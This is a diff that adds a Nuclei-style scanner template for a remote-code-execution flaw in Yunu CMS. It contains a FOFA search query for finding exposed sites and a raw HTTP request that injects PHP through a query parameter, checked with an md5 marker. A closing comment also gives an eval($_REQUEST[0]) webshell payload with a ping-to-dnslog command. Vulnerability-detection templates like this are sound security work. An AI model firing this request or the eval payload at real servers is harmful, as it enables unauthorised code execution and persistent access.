@@ -1,0 +1,32 @@
+id: yunu-cms-request_uri-rce
+
+info:
+  name: yunu-cms-request_uri-rce
+  author: unknow
+  severity: high
+  description: 云优网络科技有限公司cms系统request_uri接口存在代码执行漏洞。
+  tags: yunu,rce
+  metadata:
+    fofa-qeury: body="index/css/yunu.css"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |              
+        GET /index.php?s=wap/index/index&asdasd=aa";{{rce}};exit;?> HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 
+
+    payloads:
+      rce:
+        - "print_r(md5(12356))"
+               
+    matchers:     
+      - type: dsl
+        name: rce
+        dsl:
+          - "status_code_1 == 200 && contains(body,'7cec85c75537840dad40251576e5b757') && contains(header,'text/html')" 
+          
+#/index.php?s=wap/index/index&asdasd=aa";print_r(md5(123));eval($_REQUEST[0]);print_r(md5(123));exit;?>
+#0='ping dnslog'
